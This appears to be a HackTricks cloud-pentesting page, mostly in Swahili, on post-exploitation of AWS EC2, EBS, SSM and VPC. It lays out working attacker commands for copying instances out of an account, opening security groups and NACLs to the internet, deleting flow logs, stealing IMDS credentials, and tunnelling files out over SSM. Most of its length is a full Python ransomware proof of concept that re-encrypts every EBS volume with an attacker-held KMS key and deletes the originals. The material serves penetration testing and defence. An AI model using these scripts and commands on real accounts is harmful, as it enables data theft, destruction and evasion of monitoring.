# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Kwa taarifa zaidi angalia:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **inakokopia trafiki ya kuingilio na kutoka kwa EC2 instances ndani ya VPC** bila hitaji la kusakinisha chochote kwenye instances wenyewe. Trafiki iliyokopiwa kawaida hutumwa kwa kitu kama network intrusion detection system (IDS) kwa uchambuzi na ufuatiliaji.\
Mshambuliaji anaweza kutumia hili kunasa trafiki yote na kupata taarifa nyeti kutoka kwake:

Kwa taarifa zaidi angalia ukurasa huu:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances kawaida huwa na aina fulani ya taarifa nyeti. Kuna njia mbalimbali za kuingia ndani (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Hata hivyo, njia nyingine ya kuona nini inahifadhiwa ni **kuunda AMI na kuendesha instance mpya (hata kwenye account yako mwenyewe) kutoka kwake**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, ambayo kwa kawaida zitakuwa na **sensitive information**, kwa hivyo kuzikagua kunapaswa kufichua taarifa hizi.\
Ikiwa utapata **volume without a snapshot** unaweza: **Create a snapshot** na fanya vitendo vifuatavyo au tu **mount it in an instance** ndani ya account:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Export EC2 AMI moja kwa moja kwenda S3 ukitumia `CreateStoreImageTask` ili kupata raw disk image bila snapshot sharing. Hii inaruhusu full offline forensics au data theft huku ikiacha networking ya instance bila kuguswa.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Attach io1/io2 Multi-Attach volume kwenye instance ya pili na mount it read-only ili kuhamisha live data bila snapshots. Inafaa wakati victim volume tayari ina Multi-Attach enabled ndani ya AZ ileile.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Create EC2 Instance Connect Endpoint, authorize ingress, na inject ephemeral SSH keys kufikia private instances kupitia managed tunnel. Hutoa njia za haraka za lateral movement bila kufungua public ports.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Hamisha secondary private IP ya ENI ya victim kwenda ENI inayodhibitiwa na attacker ili kuiga trusted hosts that are allowlisted by IP. Inaruhusu bypassing internal ACLs or SG rules zilizowekwa kwa specific addresses.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassociate Elastic IP kutoka kwa victim instance kwa attacker ili kunasa inbound traffic au kuanzisha outbound connections zinazoonekana kuja kutoka trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Ikiwa security group rule inareference customer-managed prefix list, kuongeza attacker CIDRs kwenye list huipanua silently access kwenye kila dependent SG rule bila kurekebisha SG yenyewe.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Create gateway au interface VPC endpoints ili kupata tena outbound access kutoka isolated subnets. Leveraging AWS-managed private links inavuka missing IGW/NAT controls kwa data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Attacker mwenye ruhusa ya ec2:AuthorizeSecurityGroupIngress anaweza kuongeza inbound rules kwenye security groups (kwa mfano, allowing tcp:80 from 0.0.0.0/0), hivyo kufichua internal services kwenye public Internet au kwa networks zisizoidhinishwa.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Mshambulizi mwenye ruhusa ya ec2:ReplaceNetworkAclEntry (au inayofanana) anaweza kubadilisha Network ACLs (NACLs) za subnet ili kuzifanya ziwe zenye ruhusa nyingi — kwa mfano kuruhusu 0.0.0.0/0 kwenye ports muhimu — kuwekea wazi anuwai nzima ya subnet kwa Internet au kwa sehemu za mtandao zisizoidhinishwa. Tofauti na Security Groups, ambazo zinatumika per-instance, NACLs zinatumika kwa ngazi ya subnet, hivyo kubadilisha NACL kali kunaweza kuwa na athari kubwa zaidi kwa kuwezesha ufikiaji kwa hosts wengi zaidi.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Mshambulizi mwenye idhini za ec2:Delete* na iam:Remove* anaweza kufuta rasilimali muhimu za miundombinu na usanidi — kwa mfano key pairs, launch templates/versions, AMIs/snapshots, volumes au attachments, security groups au rules, ENIs/network endpoints, route tables, gateways, au managed endpoints. Hii inaweza kusababisha kusitishwa kwa huduma mara moja, kupoteza data, na kupoteza ushahidi wa forensics.

Mfano mmoja ni kufuta security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Elekeza VPC Flow Logs kwenye S3 bucket inayodhibitiwa na mshambulizi ili kukusanya metadata ya mtandao (source/destination, ports) kwa mfululizo nje ya akaunti ya mwathiri kwa ajili ya uchunguzi wa muda mrefu.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Hata ukifunga EC2 ili trafiki isiweze kutoka, bado inaweza **exfil via DNS**.

- **VPC Flow Logs hazitarekodi hili**.
- Huna ufikiaji wa AWS DNS logs.
- Zima hili kwa kuweka "enableDnsSupport" kuwa false kwa kutumia:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Mshambulizi anaweza kuita API endpoints za akaunti anayodhibiti. Cloudtrail itarekodi miito hii na mshambulizi ataweza kuona exfiltrated data katika Cloudtrail logs.

### Open Security Group

Unaweza kupata ufikiaji zaidi wa huduma za mtandao kwa kufungua bandari kama ifuatavyo:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Inawezekana kuendesha EC2 instance na kuisajili ili itumike kuendesha instances za ECS kisha kuiba data za instances za ECS.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

Kudukuliwa ndani ya task yoyote ya ECS inayotokea kwenye EC2 container instance kwa kawaida inatosha ku-pivot kwenda kwenye host role na IAM roles zinazohusiana na tasks zote nyingine kwenye node hiyo. Kwa sababu hakuna task isolation kwa ECS-on-EC2, kila task inaweza kuulizia EC2 Instance Metadata Service (IMDS) kwa default, kuiba container instance profile, kisha kuzungumza protocol ile ile ya WebSocket ambayo ECS agent inatumia kwenda kwenye control plane (primitive ya **ECScape**) ili kuomba credentials za kila task inayopangwa sasa kwenye host hiyo. Latacora ilidokumeta workflow hii katika utafiti wao wa [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), ambayo muhtasari wa kimkakati ufuatao unaiweka kwa ufupi.

#### Attack chain

1. **Chukua the instance profile kutoka ndani ya container.** Kubali IMDSv2 inahitajika, hivyo omba tokeni kisha pokea profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Tumia container instance role kuiga ECS agent.** Kwa credentials hizo unaweza kuzungumza kwenye channel isiyoandikwa ya WebSocket ambayo ECS agent inatumia; control plane inakuamini kama agent halisi na inakuletea **all task IAM credentials** kwa process yako. Sasa unaweza kuendesha tasks zenye privileges za juu kwa loka, kutoa secrets za environment za task, au kusasisha services/tasks ili kuredeploy workloads ambazo unaweza kuchunguza kikamilifu.

#### IMDS reachability with IMDSv2 + hop limit 1

Kuweka IMDSv2 na `HttpTokens=required` na `HttpPutResponseHopLimit=1` kunazuia tu tasks zinazotafuta nyuma ya hop ya ziada (Docker bridge). Mode nyingine za mitandao zinabaki ndani ya hop moja kutoka kwa Nitro controller na bado zinapokea majibu:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Kila task inapewa ENI yake mwenyewe ambayo bado iko umbali wa hop moja kutoka IMDS, hivyo tokeni na majibu ya metadata yanawasili kwa mafanikio. |
| `host` | ✅ | Tasks hushiriki host namespace, hivyo zinaona umbali wa hop ule ule kama EC2 instance. |
| `bridge` | ❌ | Majibu yanakufa kwenye Docker bridge kwa sababu hop ya ziada inamaliza kikomo cha hop. |

Kwa hivyo, **usidhani chochote kwamba hop limit 1 inalinda awsvpc au host-mode workloads**—daima jaribu kutoka ndani ya containers zako.

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs, au marekebisho ya routing hayawezi kuzuia link-local address 169.254.169.254 kwa sababu Nitro inaingiza kwenye host. Angalia `/etc/ecs/ecs.config` kwa `ECS_AWSVPC_BLOCK_IMDS=true`. Ikiwa flag haipo (default) unaweza curl IMDS moja kwa moja kutoka kwenye task. Ikiwa imewekwa, pivot kwa host/agent namespace ili kuirudisha au endesha tooling yako nje ya awsvpc.

- **bridge mode:** Wakati maombi ya metadata yanashindwa ingawa hop limit 1 imewekwa, defenders labda waliingiza rule ya `DOCKER-USER` ya DROP kama `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Kuorodhesha `iptables -S DOCKER-USER` kunaifunua, na access ya root inakuwezesha kufuta au kurekebisha order ya rule kabla ya kuulizia IMDS.

- **host mode:** Angalia agent configuration kwa `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. Mipangilio hiyo inatoa task IAM roles kabisa, hivyo lazima uiamishe tena, uhamishe kwenda awsvpc tasks, au uibe credentials kupitia process nyingine kwenye host. Wakati thamani ni `true` (default), kila process ya host-mode—ikiwa ni pamoja na containers zilizodukuliwa—inaweza kufikia IMDS isipokuwa kama kuna eBPF/cgroup filters maalum zinazolenga `169.254.169.254`; tazama programu za tc/eBPF au iptables rules zinazotaja address hiyo.

Latacora pia ilitoa [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) unayoweza kuiweka ndani ya akaunti ya target ili kuorodhesha ni network modes gani bado zinafunua metadata na kupanga hatua yako inayofuata ipasavyo.

Mara kuelewa ni modes gani zinafunua IMDS unaweza kupanga njia yako ya post-exploitation: lengwa task yoyote ya ECS, omba instance profile, iga agent, na vuna role za kazi nyingine zote kwa movement ya lateral au persistence ndani ya cluster.

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Ruhusa zinazohitajika:

- `ssm:StartSession`

Mbali na command execution, SSM inaruhusu traffic tunneling ambayo inaweza kutumika vibaya ili pivot kutoka kwa EC2 instances ambazo hazina network access kwa sababu ya Security Groups au NACLs.
Moja ya matukio ambapo hili linakuwa muhimu ni pivoting kutoka kwa [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) kwenda private EKS cluster.

> Ili kuanza session unahitaji SessionManagerPlugin kusakinishwa: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Sakinisha SessionManagerPlugin kwenye mashine yako
2. Ingia kwenye Bastion EC2 ukitumia amri ifuatayo:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Pata vyeti vya muda vya Bastion EC2 za AWS kwa kutumia script ya [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Hamisha vyeti kwenye mashine yako katika faili `$HOME/.aws/credentials` kama profile `[bastion-ec2]`
5. Ingia kwenye EKS kama Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Sasisha kipengee `server` kwenye faili `$HOME/.kube/config` ili kiielekeze kwa `https://localhost`
7. Unda SSM tunnel kama ifuatavyo:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Trafiki kutoka kwa chombo `kubectl` sasa imepelekwa kupitia tuneli ya SSM, kupitia Bastion EC2, na unaweza kufikia klasta ya EKS ya kibinafsi kutoka kwa mashine yako mwenyewe kwa kuendesha:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Kumbuka kuwa muunganisho wa SSL hayatofanikiwa isipokuwa uweke bendera `--insecure-skip-tls-verify` (au sawa nayo katika zana za ukaguzi za K8s). Kwa kuwa trafiki inapitia tuneli salama ya AWS SSM, uko salama dhidi ya aina yoyote ya mashambulizi ya MitM.

Mwisho, mbinu hii si maalum kwa kushambulia private EKS clusters. Unaweza kuweka domains na ports yoyote ili ku-pivot kwenda service nyingine yoyote ya AWS au custom application.

---

#### Forward ya Port Haraka: Local ↔️ Remote (AWS-StartPortForwardingSession)

Ikiwa unahitaji tu ku-forward **port moja ya TCP kutoka EC2 instance hadi localhost yako** unaweza kutumia `AWS-StartPortForwardingSession` SSM document (hakuna parameter ya remote host inahitajika):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Amri inaunda tunnel yenye mwelekeo wa pande zote kati ya workstation yako (`localPortNumber`) na port iliyochaguliwa (`portNumber`) kwenye instance **bila kufungua sheria yoyote za inbound za Security-Group**.

Matumizi ya kawaida:

* **File exfiltration**
1. Kwenye instance, anzisha HTTP server wa muda mfupi unaoonyesha direktori unayotaka exfiltrate:

```bash
python3 -m http.server 8000
```

2. Kutoka kwenye workstation yako, pakua faili kupitia SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Kupata maombi ya wavuti ya ndani (mfano Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Kidokezo: Compress na encrypt ushahidi kabla ya ku-exfiltrating ili CloudTrail isirekodi maudhui wazi (clear-text):
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Shiriki AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Tafuta taarifa nyeti katika AMIs za umma na za kibinafsi

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel ni zana iliyoundwa ili **kutafuta taarifa nyeti ndani ya Amazon Machine Images (AMIs) za umma au za kibinafsi**. Inautomatisha mchakato wa kuanzisha instances kutoka kwa AMIs lengwa, mounting volumes zao, na kuchunguza kwa ajili ya potential secrets au data nyeti.

### Shiriki EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Proof of concept inayofanana na maonyesho ya Ransomware yaliyotolewa katika maelezo ya S3 post-exploitation. KMS inapaswa kubadilishwa jina kuwa RMS kwa Ransomware Management Service kutokana na urahisi wa kuitumia ku-encrypt huduma mbalimbali za AWS.

Kwanza, kutoka kwenye akaunti ya AWS ya 'attacker', tengeneza ufunguo unaosimamiwa na mteja katika KMS. Kwa mfano huu tutamruhusu AWS kusimamia data ya ufunguo, lakini katika hali halisi mhalifu angehifadhi data ya ufunguo nje ya udhibiti wa AWS. Badilisha sera ya ufunguo ili kuruhusu Principal yeyote wa akaunti ya AWS kutumia ufunguo. Kwa sera hii ya ufunguo, jina la akaunti lilikuwa 'AttackSim' na sheria ya sera inayoruhusu ufikiaji wote inaitwa 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Similar to the S3 ransomware example. This attack will create copies of the attached EBS volumes using snapshots, use the publicly available key from the 'attacker' account to encrypt the new EBS volumes, then detach the original EBS volumes from the EC2 instances and delete them, and then finally delete the snapshots used to create the newly encrypted EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

This results in only encrypted EBS volumes left available in the account.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Also worth noting, the script stopped the EC2 instances to detach and delete the original EBS volumes. The original unencrypted volumes are gone now.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Next, return to the key policy in the 'attacker' account and remove the 'Outside Encryption' policy rule from the key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Subiri muda mfupi ili sera ya ufunguo iliyowekwa hivi karibuni ipenye. Kisha rudi kwenye akaunti ya 'victim' na jaribu ku-attach moja ya EBS volumes mpya zilizofichwa (encrypted). Utagundua kuwa unaweza ku-attach volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Lakini unapo jaribu kuanzisha tena instance ya EC2 ukiwa ume-attach EBS volume iliyofichwa (encrypted), itashindwa na itarudi kutoka kwenye hali ya 'pending' hadi 'stopped' kwa muda usioamuliwa kwa sababu EBS volume iliyounganishwa haiwezi kuo-decrypt kwa kutumia key kwa kuwa sera ya ufunguo haijiruhusu tena.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Hii ni python script iliyotumika. Inachukua AWS creds za akaunti ya 'victim' na thamani ya AWS ARN inayopatikana hadharani kwa key itakayotumika kwa encryption. Script itatengeneza nakala za encrypted za ALL available EBS volumes zinazounganishwa na ALL EC2 instances katika akaunti ya AWS iliyolengwa, kisha itasimamisha kila EC2 instance, itadetach EBS volumes asili, kuzifuta, na hatimaye kufuta snapshots zote zilizotumika wakati wa mchakato. Hii itaacha tu encrypted EBS volumes katika akaunti ya 'victim' iliyolengwa. TUMIA SCRIPT HII TU KATIKA MAZINGIRA YA MAJARIBIO; INAHARIBU NA ITAFOUTA VOLUME ZOTE ASILI ZA EBS. Unaweza kuzirejesha kwa kutumia KMS key iliyotumika na kuzirejesha katika hali yao ya awali kupitia snapshots, lakini napenda kukufahamisha kuwa mwishowe ni ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Marejeo

- [Latacora - ECS on EC2: Covering Gaps in IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening repo ya Terraform](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – Jinsi ya kuhamisha faili katika AWS kutumia SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
